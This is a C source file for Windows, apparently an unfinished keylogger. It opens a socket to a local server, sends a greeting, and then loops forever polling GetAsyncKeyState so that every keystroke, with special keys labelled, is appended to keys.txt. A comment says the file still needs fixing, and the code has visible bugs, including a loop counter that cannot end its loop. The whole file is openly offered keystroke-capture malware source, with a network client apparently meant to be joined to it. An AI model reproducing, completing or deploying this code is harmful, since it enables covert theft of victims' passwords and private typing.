#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winuser.h>
#include <string.h>


// this file still needs fixing 

void startLogging();
void startWinsock(WSADATA* wsaData);
int startSocket();
void connectToServer(struct sockaddr_in* serv_addr, int client_fd);
void sendMsg(int client_fd, const char* msg);
void closeSocket(int client_fd);


int main(){
    int valread;
    int client_fd;
    struct sockaddr_in serv_addr;
    const char* msg = "Hello from client";
    char buffer[1024] = { 0 };
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);

    startWinsock(&wsaData);
    client_fd = startSocket();
    connectToServer(&serv_addr, client_fd);
    sendMsg(client_fd, msg);
    closeSocket(client_fd);

    startLogging();
    return 0; 
}

void startLogging(){
    FILE *keysPtr;
    keysPtr = fopen("keys.txt", "w");
    keysPtr = fopen("keys.txt", "a");
    char c;
    while(1){
        for (c = 0; c < 255; c++){
            short pressed = GetAsyncKeyState(c) & 0x1;
            if (pressed){
                const char *text;
                switch (c) {
                    case VK_BACK:
                        text = "[backspace]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_RETURN:
                        text = "[enter]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_SHIFT:
                        text = "[shift]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_CONTROL:
                        text = "[ctrl]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_CAPITAL:
                        text = "[caps]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_TAB:
                        text = "[tab]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_MENU:
                        text = "[alt]";
                        fprintf(keysPtr, "%s", text);
                        break;
                    case VK_LBUTTON:
                        break;
                    case VK_RBUTTON:
                        break; 
                    default:
                        char str[2];
                        str[0] = c;
                        str[1] = '\0';
                        text = str;
                        fprintf(keysPtr, "%s", text);
                }
                
            }
        }
    }
}

void startWinsock(WSADATA* wsaData){
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
    }
}

int startSocket(){
    int client_fd;
    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
    }
    return client_fd;
}

void connectToServer(struct sockaddr_in* serv_addr, int client_fd){

    if (inet_pton(AF_INET, "127.0.0.1", &serv_addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(client_fd);
        WSACleanup();
        exit(EXIT_FAILURE);
    }

    if (connect(client_fd, (struct sockaddr*)serv_addr,sizeof(*serv_addr)) < 0) {
        printf("\nConnection Failed \n");
        printf("%i", client_fd);
        closesocket(client_fd);
        WSACleanup();
        exit(EXIT_FAILURE);
    }
}

void sendMsg(int client_fd, const char* msg){
    send(client_fd, msg, strlen(msg), 0);
    printf("Hello message sent\n");
}

void closeSocket(int client_fd){
    closesocket(client_fd);
    WSACleanup();
}